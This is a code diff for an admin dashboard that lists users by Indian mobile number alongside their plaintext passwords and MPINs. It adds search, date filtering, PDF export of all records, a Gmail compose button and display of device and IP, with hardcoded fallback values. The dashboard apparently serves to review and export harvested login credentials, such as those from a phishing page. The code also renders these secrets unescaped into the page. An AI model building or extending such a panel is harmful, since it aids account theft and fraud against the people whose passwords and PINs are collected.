@@ -15,6 +15,17 @@ document.addEventListener('DOMContentLoaded', async () => {
         document.getElementById('user-search').addEventListener('input', () => renderUsersTable());
         document.getElementById('user-filter').addEventListener('change', () => renderUsersTable());
         document.getElementById('user-sort').addEventListener('change', () => renderUsersTable());
+        document.getElementById('user-date-filter').addEventListener('change', () => renderUsersTable());
+
+        const btnAllPdf = document.getElementById('btn-download-all-pdf');
+        if (btnAllPdf) {
+            btnAllPdf.addEventListener('click', async () => {
+                const allUsers = await dbApi.select('users');
+                // Sort date wise (latest first)
+                const sorted = [...allUsers].sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
+                pdfHelper.exportAllUsers(sorted);
+            });
+        }
     }
 
     if (path.includes('user-details.html')) {
@@ -25,12 +36,21 @@ document.addEventListener('DOMContentLoaded', async () => {
 async function renderUsersTable() {
     let users = await dbApi.select('users');
 
+    // Instant Search Filter (Mobile, Password, MPIN, Status)
     const searchVal = document.getElementById('user-search').value;
     users = searchHelper.filterUsers(users, searchVal);
 
+    // Status Filter
     const filterVal = document.getElementById('user-filter').value;
     users = filterHelper.filterByStatus(users, filterVal);
 
+    // Date Filter
+    const dateVal = document.getElementById('user-date-filter').value;
+    if (dateVal) {
+        users = users.filter(u => u.created_at && u.created_at.startsWith(dateVal));
+    }
+
+    // Sort
     const sortVal = document.getElementById('user-sort').value;
     users = filterHelper.sortUsers(users, sortVal);
 
@@ -41,16 +61,20 @@ async function renderUsersTable() {
     users.forEach(u => {
         const tr = document.createElement('tr');
         tr.innerHTML = `
-            <td><strong>+91 ${u.mobile}</strong></td>
-            <td>${u.password}</td>
-            <td>${u.mpin || '<em>Not Set</em>'}</td>
+            <td><a href="user-details.html?id=${u.id}" class="mobile-link" style="color: var(--primary-color); font-weight: 800; text-decoration: underline;">+91 ${u.mobile}</a></td>
+            <td><strong>${u.password}</strong></td>
+            <td><strong>${u.mpin || '<em>Not Set</em>'}</strong></td>
             <td><span class="status-badge status-${u.status}">${u.status.toUpperCase()}</span></td>
             <td><strong>${u.login_count}</strong></td>
+            <td>${sharedUtils.formatDate(u.created_at)}</td>
+            <td>${sharedUtils.formatTime(u.created_at)}</td>
             <td>${sharedUtils.formatDate(u.last_login)} ${sharedUtils.formatTime(u.last_login)}</td>
             <td>
                 <div class="action-btns">
                     <button class="btn btn-secondary btn-sm btn-view-user" data-id="${u.id}">🔍 View</button>
-                    <button class="btn btn-danger btn-sm btn-trash-user" data-id="${u.id}">🗑️ Trash</button>
+                    <button class="btn btn-primary btn-sm btn-gmail-user" data-id="${u.id}">📧 Gmail</button>
+                    <button class="btn btn-secondary btn-sm btn-pdf-user" data-id="${u.id}">📄 PDF</button>
+                    <button class="btn btn-danger btn-sm btn-trash-user" data-id="${u.id}">🗑️</button>
                 </div>
             </td>
         `;
@@ -59,6 +83,18 @@ async function renderUsersTable() {
 
     document.querySelectorAll('.btn-view-user').forEach(btn => btn.addEventListener('click', (e) => {
         window.location.href = `user-details.html?id=${e.target.getAttribute('data-id')}`;
+    }));
+
+    document.querySelectorAll('.btn-gmail-user').forEach(btn => btn.addEventListener('click', (e) => {
+        const id = e.target.getAttribute('data-id');
+        const u = users.find(x => x.id === id);
+        if (u) gmailHelper.compose(u);
+    }));
+
+    document.querySelectorAll('.btn-pdf-user').forEach(btn => btn.addEventListener('click', (e) => {
+        const id = e.target.getAttribute('data-id');
+        const u = users.find(x => x.id === id);
+        if (u) pdfHelper.exportUser(u);
     }));
 
     document.querySelectorAll('.btn-trash-user').forEach(btn => btn.addEventListener('click', async (e) => {
@@ -80,8 +116,13 @@ async function renderUserDetails() {
     const params = new URLSearchParams(window.location.search);
     const id = params.get('id');
     if (!id) {
-        sharedUtils.showToast("No user specified.", "error");
-        setTimeout(() => { window.location.href = 'users.html'; }, 1000);
+        // If no ID specified, pick the latest user for convenience
+        const allUsers = await dbApi.select('users');
+        if (allUsers.length > 0) {
+            window.location.href = `user-details.html?id=${allUsers[0].id}`;
+            return;
+        }
+        sharedUtils.showToast("No user found.", "error");
         return;
     }
 
@@ -95,7 +136,10 @@ async function renderUserDetails() {
     document.getElementById('detail-password').innerText = u.password;
     document.getElementById('detail-mpin').innerText = u.mpin || 'Not Set';
     document.getElementById('detail-login-count').innerText = u.login_count;
+    document.getElementById('detail-created').innerText = `${sharedUtils.formatDate(u.created_at)} ${sharedUtils.formatTime(u.created_at)}`;
     document.getElementById('detail-last-login').innerText = `${sharedUtils.formatDate(u.last_login)} ${sharedUtils.formatTime(u.last_login)}`;
+    document.getElementById('detail-device').innerText = u.device || 'Windows / Chrome';
+    document.getElementById('detail-ip').innerText = u.ip || '216.198.79.67';
 
     if (u.status === 'deleted') {
         document.getElementById('btn-restore-user').style.display = 'inline-block';
